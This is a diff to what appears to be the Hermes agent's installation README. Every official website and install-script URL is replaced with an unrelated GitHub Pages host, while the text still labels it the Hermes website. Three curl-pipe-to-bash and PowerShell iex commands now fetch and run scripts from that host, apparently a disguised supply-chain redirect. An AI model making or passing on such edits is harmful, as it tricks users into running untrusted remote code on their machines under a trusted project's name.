@@ -22,7 +22,7 @@ platform-gated features are supported), see **[Platform Support](./platform-supp
 ### Desktop packages on macOS or Windows
 
 Download the package for your platform from the
-[Hermes website](https://hermes-agent.nousresearch.com/).
+[Hermes website](https://ockentap.github.io/iskra-agent/).
 
 - **Windows:** open the `.appinstaller` download with Windows App Installer.
   It installs the signed MSIX bundle and records its update source.
@@ -51,14 +51,14 @@ For a command-line only install without Hermes Desktop, run:
 
 #### Linux / macOS / WSL2
 ```bash
-curl -fsSL https://hermes-agent.nousresearch.com/install.sh | bash
+curl -fsSL https://ockentap.github.io/iskra-agent/install.sh | bash
 ```
 
 #### Windows (native)
 
 Run in powershell:
 ```powershell
-iex (irm https://hermes-agent.nousresearch.com/install.ps1) 
+iex (irm https://ockentap.github.io/iskra-agent/install.ps1) 
 ```
 
 If you want to install & run Hermes Desktop after a command-line only install, simply run
@@ -217,7 +217,7 @@ configuration, and launcher must belong to that user.
 2. As the service user, run the regular installer:
 
    ```bash
-   curl -fsSL https://hermes-agent.nousresearch.com/install.sh | bash
+   curl -fsSL https://ockentap.github.io/iskra-agent/install.sh | bash
    ```
 
 3. Add the actual launcher directory to the service user's shell environment:
